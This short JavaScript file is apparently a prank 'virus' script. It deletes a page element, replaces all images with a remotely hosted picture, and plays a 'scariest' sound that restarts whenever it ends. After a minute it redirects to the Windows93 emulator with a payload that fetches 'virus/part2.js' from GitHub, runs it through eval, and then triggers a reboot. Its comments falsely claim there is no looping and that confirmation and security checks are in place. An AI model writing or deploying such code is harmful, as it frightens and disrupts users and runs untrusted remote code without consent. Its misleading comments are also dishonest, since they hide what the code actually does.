// Targeting elements
const targetDiv = document.querySelector('div.pa0');
const allImages = document.querySelectorAll('img');

// Function to replace images and play sound (without autoplay or loop)
function modifyContent() {
  if (targetDiv) {
    targetDiv.remove(); // Remove the targeted div
  }

  allImages.forEach(image => {
    image.src = 'https://leopard.hosting.pecon.us/dl/vzcbl/gdfdfgdfghdfgdfh.png'; // Replace image source
  });

  // Play sound (without autoplay or loop, user interaction required)
  const sound = new Audio();
  sound.src = 'https://leopard.hosting.pecon.us/dl/iosss/scariest.wav'; // Replace with your sound file path
  sound.addEventListener('ended', () => {
      sound.play();
  });
  sound.play();
}

// Alert and redirection (with confirmation and security considerations)
function redirectWithAlert() {
    window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
    setTimeout(function(){
    $exe("reboot")
    },1000)
}

// Call the functions (modify content first, then handle alert and redirection)
modifyContent();
setTimeout(function(){
redirectWithAlert();
},60000)
